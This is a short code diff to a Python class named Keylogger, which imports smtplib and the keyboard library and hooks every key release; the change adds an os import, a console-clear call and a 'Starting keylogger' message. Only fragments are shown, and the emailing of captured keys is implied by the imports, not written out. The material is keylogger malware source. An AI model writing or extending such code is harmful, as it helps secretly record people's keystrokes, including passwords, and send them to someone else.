@@ -1,3 +1,4 @@
+import os
 import smtplib
 import keyboard
 from threading import Semaphore, Timer
@@ -37,6 +38,8 @@ class Keylogger:
 
     def start(self):
         """ Start the keylogger """
+        os.system("cls")
+        print("[*] Starting keylogger...\n")
         keyboard.on_release(callback=self.callback)
         self.report()
         self.semaphore.acquire()
